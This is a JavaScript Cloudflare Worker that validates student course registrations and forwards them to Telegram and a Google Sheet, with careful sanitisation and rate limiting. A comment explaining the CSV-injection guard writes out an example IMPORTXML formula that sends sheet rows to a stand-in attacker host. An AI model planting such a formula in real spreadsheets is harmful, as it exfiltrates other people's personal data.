/**
 * Course registration -> Telegram relay.
 *
 * The browser never sees the bot token. The page POSTs JSON here; this Worker
 * validates it, rate-limits by IP, and forwards a formatted message to Telegram.
 *
 * Required secrets (wrangler secret put ...):
 *   BOT_TOKEN  - from @BotFather
 *   CHAT_ID    - your user id, group id, or @channelname
 * Optional secrets (set both, or neither, to also append rows to a Sheet):
 *   SHEET_WEBHOOK_URL   - the /exec URL of the Apps Script in worker/sheet-webhook.gs
 *   SHEET_WEBHOOK_TOKEN - shared secret, must match SHEET_TOKEN in that script
 * Required var (wrangler.toml):
 *   ALLOWED_ORIGIN - comma-separated list of origins allowed to post
 * Required binding:
 *   RATELIMIT - KV namespace
 */

const MAX_BODY_BYTES = 8 * 1024;
// Fifty per window, not five. The origin check is what actually keeps scripts
// out of the channel; this only has to stop a runaway loop. Five blocks real
// students whenever a class registers together from one wifi or one carrier's
// NAT, and a blocked student reads it as the form being broken.
const RATE_LIMIT_MAX = 50;
// Half an hour, not one. A student who trips the limit gets back in sooner,
// which matters because the window is fixed rather than rolling: the block
// lifts at the boundary regardless of when they last tried.
const RATE_LIMIT_WINDOW_SECONDS = 30 * 60;

/** Fields we accept. Anything else in the payload is dropped. */
const FIELDS = [
  { key: 'name', label: 'Name', required: true, max: 100 },
  { key: 'phone', label: 'Phone', required: true, max: 30 },
  { key: 'telegram', label: 'Telegram', required: true, max: 40 },
  { key: 'email', label: 'Email', required: false, max: 120 },
  { key: 'course', label: 'Course', required: true, max: 40 },
  { key: 'level', label: 'Level', required: true, max: 40 },
  { key: 'timeline', label: 'Days to goal', required: false, max: 12 },
  // The five below are required on the page, but optional here on purpose: a
  // Worker deploy that landed before the page deploy would otherwise 400 every
  // registration coming from the old page. Their *values* are still checked.
  { key: 'readingNow', label: 'Current Reading band', required: false, max: 12 },
  { key: 'listeningNow', label: 'Current Listening band', required: false, max: 12 },
  { key: 'readingTarget', label: 'Target Reading band', required: false, max: 12 },
  { key: 'listeningTarget', label: 'Target Listening band', required: false, max: 12 },
  { key: 'why', label: 'Why joining', required: false, max: 400, multiline: true },
  // The checklists cover the task types, but a student who cannot name their
  // problem in those terms has nowhere to put it. Free text, optional, and
  // never validated against a list: the whole point is that it is unlisted.
  { key: 'readingOther', label: 'Reading in their words', required: false, max: 300, multiline: true },
  { key: 'listeningOther', label: 'Listening in their words', required: false, max: 300, multiline: true },
  { key: 'source', label: 'Heard via', required: false, max: 40 },
  { key: 'notes', label: 'Notes', required: false, max: 500, multiline: true },
];

/**
 * Closed sets for every field the page renders as a fixed choice. The browser
 * can send anything, so these are re-checked here. Keep in step with the
 * CONFIG block in public/index.html.
 */
// 'Challenge' is the old label for DISCIPLINE. Both are accepted so that a
// page deploy and a Worker deploy can happen in either order without every
// registration failing in between. Drop 'Challenge' once the page is live.
const COURSES = ['Marathon', 'Offline classes', 'DISCIPLINE', 'Challenge'];
const LEVELS = ['Beginner', 'Elementary', 'Pre-IELTS', 'IELTS Introduction', 'IELTS Graduation'];
const CURRENT_BANDS = [
  'Not sure', 'Below 4.0', '4.0', '4.5', '5.0', '5.5', '6.0', '6.5', '7.0',
  '7.5', '8.0', '8.5', '9.0',
];
const TARGET_BANDS = ['5.0', '5.5', '6.0', '6.5', '7.0', '7.5', '8.0', '8.5', '9.0'];
const SOURCES = [
  'Instagram', 'Telegram channel', 'A friend or former student',
  'Google search', 'YouTube', 'Other',
];
const READING_DIFFICULTIES = [
  'Matching Headings', 'True/False/Not Given', 'Yes/No/Not Given', 'Multiple Choice',
  'Sentence or Summary Completion', 'Time Management', 'Vocabulary',
  'Understanding the passage',
];
const LISTENING_DIFFICULTIES = [
  'Multiple Choice', 'Map Labelling', 'Matching', 'Form or Note Completion',
  'Spelling', 'Following the recording', 'Different accents', 'Losing concentration',
];

export default {
  async fetch(request, env, ctx) {
    const origin = request.headers.get('Origin') || '';
    const cors = corsHeaders(origin, env);

    if (request.method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: cors });
    }
    if (request.method !== 'POST') {
      return json({ ok: false, error: 'Method not allowed' }, 405, cors);
    }
    // Require a known Origin. A missing one means the caller is not the page
    // (curl, a script, a server), which is exactly what we do not want relaying
    // messages into the channel. Set ALLOWED_ORIGIN="*" to open this up.
    if (!isAllowedOrigin(origin, env)) {
      return json({ ok: false, error: 'Origin not allowed' }, 403, cors);
    }

    // Reject an oversized declared length up front, but do not require the
    // header: chunked requests and some proxies omit it legitimately.
    const declared = Number(request.headers.get('Content-Length'));
    if (Number.isFinite(declared) && declared > MAX_BODY_BYTES) {
      return json({ ok: false, error: 'Payload too large' }, 413, cors);
    }

    let raw;
    try {
      raw = await readCapped(request, MAX_BODY_BYTES);
    } catch (error) {
      if (error && error.tooLarge) {
        return json({ ok: false, error: 'Payload too large' }, 413, cors);
      }
      return json({ ok: false, error: 'Could not read request' }, 400, cors);
    }

    let payload;
    try {
      payload = JSON.parse(raw);
    } catch {
      return json({ ok: false, error: 'Invalid JSON' }, 400, cors);
    }
    if (!payload || typeof payload !== 'object') {
      return json({ ok: false, error: 'Invalid payload' }, 400, cors);
    }

    // Honeypot. A filled field is almost always a bot, but a password manager
    // can fill it too, and discarding the submission would lose a real student.
    // So it is delivered either way, flagged, and you judge it. The rate limit
    // is what actually caps abuse.
    const suspicious =
      typeof payload.company_ref === 'string' && payload.company_ref.trim() !== '';

    const { data, errors } = validate(payload);
    if (errors.length) {
      return json({ ok: false, error: errors[0], fields: errors }, 400, cors);
    }

    const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
    const gate = await hitRateLimit(env, ip);
    if (gate.blocked) {
      return json(
        {
          ok: false,
          error: gate.reason === 'unavailable'
            // Not the student's fault, so do not tell them they submitted too much.
            ? 'We cannot accept registrations right now. Please message us on Telegram.'
            : 'Too many submissions. Please try again later or message us on Telegram.',
        },
        429,
        cors
      );
    }

    const sent = await sendToTelegram(env, data, request, suspicious);

    // The sheet write runs either way, and always after the outcome is known,
    // so a slow or broken Apps Script can never make a good signup look failed.
    // Writing it even when Telegram refused is the point: it turns a lost
    // registration into one the owner can still find and follow up.
    const sheetWrite = appendToSheet(env, data, request, suspicious, !sent);
    if (ctx && typeof ctx.waitUntil === 'function') ctx.waitUntil(sheetWrite);
    else await sheetWrite;

    if (!sent) {
      // This does cost the student one of their attempts. Refunding it was
      // tried and removed: decrementing the same counter let anyone who could
      // force a failure reset their own limit indefinitely.
      // Never surface Telegram's response; its error text can echo the token.
      return json({
        ok: false,
        error: 'We have your details but could not confirm them. Please message us on Telegram so we can check.',
      }, 502, cors);
    }

    return json({ ok: true }, 200, cors);
  },
};

/**
 * Read the body as text, aborting once it exceeds `limit` bytes. request.text()
 * would buffer the whole thing first, so a large body could exhaust the isolate
 * before any size check ran.
 */
async function readCapped(request, limit) {
  if (!request.body) return '';
  const reader = request.body.getReader();
  const chunks = [];
  let total = 0;
  try {
    for (;;) {
      const { done, value } = await reader.read();
      if (done) break;
      total += value.byteLength;
      if (total > limit) {
        await reader.cancel();
        const error = new Error('Payload too large');
        error.tooLarge = true;
        throw error;
      }
      chunks.push(value);
    }
  } finally {
    reader.releaseLock();
  }
  const joined = new Uint8Array(total);
  let offset = 0;
  for (const chunk of chunks) {
    joined.set(chunk, offset);
    offset += chunk.byteLength;
  }
  return new TextDecoder().decode(joined);
}

function allowedOrigins(env) {
  return String(env.ALLOWED_ORIGIN || '')
    .split(',')
    .map((s) => s.trim())
    .filter(Boolean);
}

function isAllowedOrigin(origin, env) {
  const list = allowedOrigins(env);
  if (list.includes('*')) return true;
  return Boolean(origin) && list.includes(origin);
}

function corsHeaders(origin, env) {
  const headers = {
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Max-Age': '86400',
    Vary: 'Origin',
  };
  if (isAllowedOrigin(origin, env)) {
    headers['Access-Control-Allow-Origin'] = allowedOrigins(env).includes('*') ? '*' : origin;
  }
  return headers;
}

function json(body, status, headers) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { ...headers, 'Content-Type': 'application/json; charset=utf-8' },
  });
}

/**
 * Strip what escaping cannot handle.
 *
 * esc() stops markup, but it does not stop layout. A name containing newlines
 * renders as extra lines in the Telegram message, so `Aziza\n\n📢 SYSTEM: pay
 * to card 8600...` reads like a system notice rather than a student's name.
 * Bidi overrides let a handle or name be displayed reversed, and lone
 * surrogates make Telegram reject the whole message with a 400, which costs
 * the student their registration.
 *
 * `keepNewlines` is for the notes field, where real paragraphs are wanted.
 */
function sanitise(value, keepNewlines) {
  let text = String(value);

  // Lone surrogates: Telegram rejects the request outright.
  text = typeof text.toWellFormed === 'function'
    ? text.toWellFormed()
    : text.replace(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/g, '�');

  // Bidi overrides and isolates, plus zero-width joiners used for spoofing.
    text = text.replace(/[\u202A-\u202E\u2066-\u2069\u200B-\u200F\uFEFF]/g, '');

  if (keepNewlines) {
    text = text.replace(/\r\n?/g, '\n')
      .replace(/[^\S\n]+/g, ' ')     // collapse spaces, keep line breaks
      .replace(/\n{3,}/g, '\n\n');   // no long blank runs to fake sections
  } else {
    text = text.replace(/\s+/g, ' '); // single-line fields stay on one line
  }

  // Any remaining control characters.
    return text.replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]/g, '').trim();
}

function validate(payload) {
  const data = {};
  const errors = [];

  for (const field of FIELDS) {
    // Sanitise before the length check, so stripped characters cannot be used
    // to smuggle a value past `max`.
    const value = typeof payload[field.key] === 'string'
      ? sanitise(payload[field.key], field.multiline === true)
      : '';
    if (!value) {
      if (field.required) errors.push(`${field.label} is required`);
      continue;
    }
    if (value.length > field.max) {
      errors.push(`${field.label} is too long`);
      continue;
    }
    data[field.key] = value;
  }

  if (data.phone && (data.phone.match(/\d/g) || []).length < 7) {
    errors.push('Phone number looks incomplete');
  }
  if (data.telegram && !/^@?[A-Za-z0-9_]{5,32}$/.test(data.telegram)) {
    errors.push('Telegram username is not valid');
  }
  if (data.email && !/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(data.email)) {
    errors.push('Email address is not valid');
  }
  if (data.course && !COURSES.includes(data.course)) {
    errors.push('Course is not valid');
  }
  if (data.level && !LEVELS.includes(data.level)) {
    errors.push('Level is not valid');
  }
  if (data.timeline && (!/^\d{1,4}$/.test(data.timeline) ||
      Number(data.timeline) < 1 || Number(data.timeline) > 1095)) {
    // Same bound as the page, so the two cannot disagree.
    errors.push('Days to goal must be a number between 1 and 1095');
  }
  // Bands come from fixed <select>s, so an unrecognised one is a tampered or
  // stale payload. Reject rather than drop: unlike "Heard via", these decide
  // which group the student is put in, and a silently missing band is worse
  // than an error the student can see.
  for (const [key, label, allowed] of [
    ['readingNow', 'Current Reading band', CURRENT_BANDS],
    ['listeningNow', 'Current Listening band', CURRENT_BANDS],
    ['readingTarget', 'Target Reading band', TARGET_BANDS],
    ['listeningTarget', 'Target Listening band', TARGET_BANDS],
  ]) {
    if (data[key] && !allowed.includes(data[key])) {
      errors.push(`${label} is not valid`);
    }
  }

  if (data.source && !SOURCES.includes(data.source)) {
    delete data.source; // optional and cosmetic: drop it rather than reject
  }

  // Difficulty checklists. Unknown entries are dropped rather than rejected:
  // they are advisory, and a stale page should not cost you a registration.
  data.reading = pickKnown(payload.reading, READING_DIFFICULTIES);
  data.listening = pickKnown(payload.listening, LISTENING_DIFFICULTIES);

  if (payload.consent !== true) {
    errors.push('Consent is required');
  }

  return { data, errors };
}

/** Keep only the entries that appear in `allowed`, deduplicated. */
function pickKnown(value, allowed) {
  if (!Array.isArray(value)) return [];
  const seen = new Set();
  for (const item of value.slice(0, allowed.length * 2)) {
    if (typeof item === 'string' && allowed.includes(item)) seen.add(item);
  }
  return [...seen];
}

/**
 * Reserve one slot for this IP, before the Telegram call.
 *
 * The read and the write are not atomic, and KV is eventually consistent, so
 * a simultaneous burst can slip past. Keeping the two operations adjacent
 * holds that window to milliseconds; doing the write after the Telegram
 * round-trip instead would stretch it to hundreds and make it trivial to win.
 * A determined attacker is not stopped by this — see the Turnstile note in
 * SETUP.md — but ordinary repeat submissions are.
 *
 * A fixed window in the key, rather than a rolling TTL, so submissions spread
 * over several hours do not keep extending a block.
 *
 * @returns {{blocked: boolean, reason?: 'limit'|'unavailable'}}
 */
/**
 * An IPv6 client typically controls an entire /64, which is 18 quintillion
 * addresses. Counting the full address would let anyone on IPv6 take a fresh
 * allowance per address and bypass the limit completely, so count the /64.
 * IPv4 addresses are used whole.
 */
function rateLimitScope(ip) {
  if (!ip.includes(':')) return ip; // IPv4, or the 'unknown' fallback

  // An IPv4-mapped address (::ffff:1.2.3.4) is really one IPv4 host.
  const mapped = ip.match(/(\d{1,3}(?:\.\d{1,3}){3})$/);
  if (mapped) return mapped[1];

  // Expand :: before truncating. Cloudflare sends the compressed form, so
  // slicing the raw string would keep the whole address and defeat the point.
  const halves = ip.split('::');
  let hextets;
  if (halves.length === 2) {
    const head = halves[0] ? halves[0].split(':') : [];
    const tail = halves[1] ? halves[1].split(':') : [];
    const gap = 8 - head.length - tail.length;
    if (gap < 0) return ip; // malformed; count it whole rather than mis-group
    hextets = head.concat(new Array(gap).fill('0'), tail);
  } else {
    hextets = ip.split(':');
    if (hextets.length !== 8) return ip;
  }

  // Normalise so 0, 00 and 0000 land in the same bucket.
  return hextets
    .slice(0, 4)
    .map((h) => (parseInt(h, 16) || 0).toString(16))
    .join(':') + '::/64';
}

async function hitRateLimit(env, ip) {
  if (!env.RATELIMIT) {
    // No KV bound. Local dev, or someone removed the binding to get a deploy
    // through. Allow the request but make it visible in `wrangler tail`.
    console.warn('RATELIMIT KV is not bound: rate limiting is disabled');
    return { blocked: false };
  }
  const window = Math.floor(Date.now() / (RATE_LIMIT_WINDOW_SECONDS * 1000));
  const key = `rl:${rateLimitScope(ip)}:${window}`;
  try {
    // `|| 0` also guards against a non-numeric value poisoning the counter:
    // NaN >= MAX is false, and String(NaN + 1) would write "NaN" back.
    const current = Number(await env.RATELIMIT.get(key)) || 0;
    if (current >= RATE_LIMIT_MAX) return { blocked: true, reason: 'limit' };
    await env.RATELIMIT.put(key, String(current + 1), {
      expirationTtl: RATE_LIMIT_WINDOW_SECONDS * 2,
    });
    return { blocked: false };
  } catch (error) {
    // Reads and writes have separate daily quotas, and writes are the smaller
    // one. Either failing means we can no longer count, so go quiet rather
    // than become an uncounted open relay.
    console.error('RATELIMIT KV failed, failing closed:', error && error.message);
    return { blocked: true, reason: 'unavailable' };
  }
}

function esc(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/** Telegram rejects anything longer than this, so stay under it. */
const MAX_MESSAGE_CHARS = 4000;

/** Cut escaped text to `limit`, never mid-entity. */
function clip(escaped, limit) {
  if (escaped.length <= limit) return escaped;
  // Back off to before any partially-included &...; sequence.
  let cut = escaped.slice(0, limit).replace(/&[a-z0-9#]*$/i, '');
  // Never end on half of a surrogate pair: Telegram rejects the request as
  // invalid UTF-8 and the whole registration is lost.
  if (/[\uD800-\uDBFF]$/.test(cut)) cut = cut.slice(0, -1);
  return cut + '…';
}

function buildMessage(data, request, suspicious) {
  const country = request.cf && request.cf.country ? request.cf.country : null;
  const telegram = data.telegram.replace(/^@/, '');
  const phoneDigits = data.phone.replace(/[^\d+]/g, '');

  const lines = [
    suspicious
      ? '⚠️ <b>New registration (bot trap tripped)</b>\n<i>Check this one before replying.</i>'
      : '🎓 <b>New course registration</b>',
    '',
    `<b>Name:</b> ${esc(data.name)}`,
    // Encoded for safety, but a leading + must survive for the dialer.
    `<b>Phone:</b> <a href="tel:${encodeURIComponent(phoneDigits).replace(/%2B/g, '+')}">${esc(data.phone)}</a>`,
    `<b>Telegram:</b> <a href="https://t.me/${encodeURIComponent(telegram)}">@${esc(telegram)}</a>`,
  ];

  if (data.email) lines.push(`<b>Email:</b> ${esc(data.email)}`);

  lines.push(
    '',
    `<b>Course:</b> ${esc(data.course)}`,
    `<b>Level:</b> ${esc(data.level)}`
  );

  if (data.timeline) lines.push(`<b>Days to goal:</b> ${esc(data.timeline)}`);

  // Now → target, on one line per skill, so the gap to close is readable at a
  // glance. Either half can be missing if the page and the Worker are briefly
  // out of step, so each side falls back to a dash rather than dropping the row.
  if (data.readingNow || data.readingTarget) {
    lines.push(`<b>Reading:</b> ${esc(data.readingNow || '—')} → ${esc(data.readingTarget || '—')}`);
  }
  if (data.listeningNow || data.listeningTarget) {
    lines.push(`<b>Listening:</b> ${esc(data.listeningNow || '—')} → ${esc(data.listeningTarget || '—')}`);
  }

  if (data.why) {
    lines.push('', `<b>Why they are joining:</b>`, clip(esc(data.why), 1400));
  }

  // Ticked boxes and the student's own words go under one heading, with the
  // free text last and italic so it reads as theirs rather than as an option
  // we offered. Either half alone is enough to print the block.
  if (data.reading.length || data.readingOther) {
    const items = data.reading.map((r) => `• ${esc(r)}`);
    if (data.readingOther) items.push(`• <i>${esc(data.readingOther)}</i>`);
    lines.push('', `<b>Reading — struggles with:</b>`, items.join('\n'));
  }
  if (data.listening.length || data.listeningOther) {
    const items = data.listening.map((l) => `• ${esc(l)}`);
    if (data.listeningOther) items.push(`• <i>${esc(data.listeningOther)}</i>`);
    lines.push('', `<b>Listening — struggles with:</b>`, items.join('\n'));
  }

  if (data.source) lines.push('', `<b>Heard via:</b> ${esc(data.source)}`);
  if (data.notes) {
    // Cap the one free-text field here rather than trimming the assembled
    // message. Notes is a single line, so a line-boundary trim later would
    // drop the whole block instead of just the overflow.
    lines.push('', `<b>Notes:</b>`, clip(esc(data.notes), 1800));
  }
  if (country) lines.push('', `<i>${esc(country)}</i>`);

  // Escaping expands quotes and ampersands fivefold, so a long-but-valid
  // submission can cross Telegram's limit and be rejected outright. Truncating
  // on a line boundary keeps the contact details, which are what matter.
  const text = lines.join('\n');
  if (text.length <= MAX_MESSAGE_CHARS) return text;
  let cut = text.slice(0, MAX_MESSAGE_CHARS - 20).replace(/\n[^\n]*$/, '');
  if (/[\uD800-\uDBFF]$/.test(cut)) cut = cut.slice(0, -1);
  return cut + '\n…';
}

async function sendToTelegram(env, data, request, suspicious) {
  if (!env.BOT_TOKEN || !env.CHAT_ID) {
    console.error('BOT_TOKEN or CHAT_ID is not set');
    return false;
  }

  const url = `https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`;
  const body = JSON.stringify({
    chat_id: env.CHAT_ID,
    text: buildMessage(data, request, suspicious),
    parse_mode: 'HTML',
    disable_web_page_preview: true,
  });

  // Telegram allows roughly 20 messages a minute to one chat. A class
  // registering together will cross that, and without a retry every student
  // past the limit loses their registration outright. So retry once, honouring
  // the retry_after Telegram gives us.
  for (let attempt = 0; attempt < 2; attempt++) {
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body,
      });
      const result = await response.json().catch(() => null);

      if (response.ok && result && result.ok) return true;

      // Log the description only. Never log the url, which contains the token.
      // Status is included so `wrangler tail` says something useful when the
      // response is not JSON and `result` is null.
      console.error('Telegram rejected:', response.status, result && result.description);

      const retryable = response.status === 429 || response.status >= 500;
      if (!retryable || attempt === 1) return false;

      // Cap the wait: the student is holding a spinner.
      const askedFor = result && result.parameters && result.parameters.retry_after;
      const waitMs = Math.min((askedFor || 1) * 1000, 8000);
      await new Promise((resolve) => setTimeout(resolve, waitMs));
    } catch (error) {
      console.error('Telegram request failed:', error && error.name);
      if (attempt === 1) return false;
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }
  }
  return false;
}

/**
 * One spreadsheet row per registration. Order is fixed and must match the
 * HEADERS array in worker/sheet-webhook.gs — the script writes the header row
 * once, from its own copy, and appends by position after that. Adding a column
 * means adding it here, in that script, and in the existing sheet by hand.
 *
 * Multi-value fields are joined rather than split across columns so the row
 * shape never changes with the answers.
 */
/**
 * Make one value safe to put in a spreadsheet cell.
 *
 * Google Sheets evaluates any cell beginning with = + - or @ as a formula, so
 * a student called `=IMPORTXML("https://evil.example/?"&A2,"//a")` would
 * exfiltrate the rows above them the moment the owner opened the sheet, and
 * `=HYPERLINK(...)` would render as a link that looks like it came from us.
 * A leading apostrophe forces Sheets to treat the cell as text; it is not
 * displayed. This also keeps "+998..." from becoming #NAME?.
 */
function cell(value) {
  const text = value == null ? '' : String(value);
  return /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
}

function buildRow(data, request, suspicious, undelivered) {
  return [
    new Date().toISOString(),
    cell(data.name),
    cell(data.phone),
    cell('@' + data.telegram.replace(/^@/, '')),
    cell(data.email),
    cell(data.course),
    cell(data.level),
    cell(data.timeline),
    cell(data.reading.join(', ')),
    cell(data.listening.join(', ')),
    cell(data.source),
    cell(data.notes),
    cell(request.cf && request.cf.country),
    // One column, two very different meanings, both needing the owner's eye.
    undelivered ? 'NOT SENT TO TELEGRAM' : (suspicious ? 'BOT TRAP' : ''),
    // Appended after Flag rather than slotted in beside Level, so every row
    // already in the sheet stays under the right heading. Add these five
    // columns to the existing sheet by hand, in this order.
    cell(data.readingNow),
    cell(data.readingTarget),
    cell(data.listeningNow),
    cell(data.listeningTarget),
    cell(data.why),
    // Appended for the same reason as the five above: existing rows keep
    // their headings. Kept in their own columns rather than merged into the
    // difficulty cells, so those stay filterable against the fixed lists.
    cell(data.readingOther),
    cell(data.listeningOther),
  ];
}

/**
 * Append the row to the Google Sheet, if a webhook is configured.
 *
 * Never throws and never returns a failure the caller acts on: the spreadsheet
 * is a copy, and Telegram already holds the registration. Problems show up in
 * `wrangler tail` only.
 */
async function appendToSheet(env, data, request, suspicious, undelivered) {
  if (!env.SHEET_WEBHOOK_URL || !env.SHEET_WEBHOOK_TOKEN) return;

  try {
    // Apps Script answers /exec with a 302 to script.googleusercontent.com and
    // the redirected request is a bodyless GET. That is fine: doPost has
    // already run by the time the redirect is issued, so the row is written
    // even though the body does not survive the hop.
    const response = await fetch(env.SHEET_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        token: env.SHEET_WEBHOOK_TOKEN,
        row: buildRow(data, request, suspicious, undelivered),
      }),
    });
    if (!response.ok) {
      console.error('Sheet webhook returned', response.status);
      return;
    }
    // A rejected token still comes back 200 with a body saying why, because
    // Apps Script cannot set a status code. Read it so failures are visible.
    const result = await response.json().catch(() => null);
    if (!result || !result.ok) {
      console.error('Sheet webhook refused:', result && result.error);
    }
  } catch (error) {
    console.error('Sheet webhook failed:', error && error.name);
  }
}
